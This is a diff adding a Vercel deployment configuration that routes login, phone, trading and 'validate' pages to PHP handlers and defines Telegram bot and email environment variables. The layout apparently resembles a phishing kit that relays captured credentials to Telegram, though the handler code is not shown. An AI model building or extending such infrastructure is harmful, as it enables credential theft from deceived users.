@@ -1,0 +1,125 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "login/index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "phone/index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "trading/index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "ennn/index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "secure-app/index.html",
+      "use": "@vercel/static"
+    },
+    {
+      "src": "cgi-bin/*.php",
+      "use": "@vercel/php"
+    },
+    {
+      "src": "login/*.php",
+      "use": "@vercel/php"
+    },
+    {
+      "src": "phone/*.php",
+      "use": "@vercel/php"
+    },
+    {
+      "src": "trading/*.php",
+      "use": "@vercel/php"
+    },
+    {
+      "src": "ennn/validate/*.php",
+      "use": "@vercel/php"
+    },
+    {
+      "src": "includes/*.php",
+      "use": "@vercel/php"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/assets/(.*)",
+      "dest": "/assets/$1"
+    },
+    {
+      "src": "/css/(.*)",
+      "dest": "/css/$1"
+    },
+    {
+      "src": "/images/(.*)",
+      "dest": "/images/$1"
+    },
+    {
+      "src": "/js/(.*)",
+      "dest": "/js/$1"
+    },
+    {
+      "src": "/login/(.*\\.php)",
+      "dest": "/login/$1"
+    },
+    {
+      "src": "/phone/(.*\\.php)",
+      "dest": "/phone/$1"
+    },
+    {
+      "src": "/trading/(.*\\.php)",
+      "dest": "/trading/$1"
+    },
+    {
+      "src": "/ennn/validate/(.*\\.php)",
+      "dest": "/ennn/validate/$1"
+    },
+    {
+      "src": "/cgi-bin/(.*\\.php)",
+      "dest": "/cgi-bin/$1"
+    },
+    {
+      "src": "/(.*\\.php)",
+      "dest": "/$1"
+    },
+    {
+      "src": "/login",
+      "dest": "/login/index.html"
+    },
+    {
+      "src": "/phone",
+      "dest": "/phone/index.html"
+    },
+    {
+      "src": "/trading",
+      "dest": "/trading/index.html"
+    },
+    {
+      "src": "/",
+      "dest": "/index.html"
+    }
+  ],
+  "env": {
+    "TELEGRAM_BOT_TOKEN": "@telegram_bot_token",
+    "TELEGRAM_CHAT_ID": "@telegram_chat_id",
+    "SEND_EMAIL": "@send_email",
+    "DB_HOST": "@db_host",
+    "DB_USER": "@db_user",
+    "DB_PASSWORD": "@db_password",
+    "DB_NAME": "@db_name",
+    "ENABLE_RATE_LIMITING": "true",
+    "MAX_ATTEMPTS_PER_IP": "5",
+    "RATE_LIMIT_WINDOW": "300",
+    "APP_ENV": "production",
+    "APP_DEBUG": "false"
+  }
+}
